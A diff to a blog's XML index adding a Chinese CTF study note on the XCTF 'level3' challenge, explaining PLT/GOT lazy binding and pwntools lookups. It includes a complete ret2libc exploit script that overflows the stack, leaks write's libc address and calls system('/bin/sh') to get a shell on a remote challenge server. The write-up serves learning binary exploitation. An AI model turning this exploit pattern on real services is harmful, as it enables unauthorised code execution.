@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>20-10-09</title>
+    <link href="/2020/10/09/20-10-09/"/>
+    <url>/2020/10/09/20-10-09/</url>
+    
+    <content type="html"><![CDATA[<p>因为自己也写博客，也有在某些自己也不懂的地方糊弄的心思，所以总感觉看的许多同质化严重的博客文章也是这样。。。以后应该提升一下博客质量。。</p><hr><p>level3(xctf)<br>被plt-got表这一块困扰了很久，结果发现一直没有理解的是pwntools里面的elf.got函数。。<br>首先是一篇讲解很详细的参考文章<br> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a></p><p>总结一下就是：<br>.plt表指向.got.plt表，由于延迟绑定，.got.plt在函数调用之前指向.plt表，在函数调用之后才写入外部函数具体地址</p><p>再就是我一直理解错了的pwntools工具的elf.plt，elf.got函数，两者返回的是.plt表和.got.plt表的地址，而不是其存储的地址。。</p><p>题目的具体思路就是：由于level3中没有system以及字符串/bin/sh，需要在给出的libc_32.so.6中寻找。要调用外部函数需要获得其地址。由于外部函数的偏移量是固定的，可以通过泄露write函数的地址来得到偏移。同时返回main函数二次利用漏洞避免外部函数偏移量改变。</p><div class="hljs"><pre><code class="hljs lua">from pwn import *<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">"220.249.52.133"</span>,<span class="hljs-number">42977</span>)level3 = ELF(<span class="hljs-string">"level3"</span>)libc = ELF(<span class="hljs-string">"libc_32.so.6"</span>)write_plt_addr = level3.plt[<span class="hljs-string">'write'</span>]write_got_plt_addr = level3.got[<span class="hljs-string">'write'</span>]<span class="hljs-built_in">print</span>(hex(write_got_plt_addr))main_addr = level3.symbols[<span class="hljs-string">'main'</span>]#返回<span class="hljs-built_in">write</span>的plt表地址，参数分别为<span class="hljs-number">1</span>、write_got_plt_addr、<span class="hljs-number">4</span>，<span class="hljs-number">1</span>表示<span class="hljs-built_in">stdout</span>，即把.got.plt表的内容写入标准输出payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(write_plt_addr) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got_plt_addr) + p32(<span class="hljs-number">4</span>)<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)#收到标准输出的内容就是<span class="hljs-built_in">write</span>函数的真实地址write_got_addr = u32(<span class="hljs-built_in">io</span>.recv())<span class="hljs-built_in">print</span>(hex(write_got_addr))offset = write_got_addr - libc.symbols[<span class="hljs-string">'write'</span>]sys_addr = offset + libc.symbols[<span class="hljs-string">'system'</span>]bin_sh_addr = offset + libc.search(<span class="hljs-string">'/bin/sh'</span>).<span class="hljs-built_in">next</span>()payload = <span class="hljs-string">'a'</span> * (<span class="hljs-number">0x88</span>+<span class="hljs-number">0x04</span>) + p32(sys_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(bin_sh_addr)<span class="hljs-built_in">io</span>.sendlineafter(<span class="hljs-string">'Input:\n'</span>,payload)<span class="hljs-built_in">io</span>.interactive()</code></pre></div>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf刷题笔记</category>
+      
+    </categories>
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>20-10-08</title>
     <link href="/2020/10/08/20-10-08/"/>
     <url>/2020/10/08/20-10-08/</url>
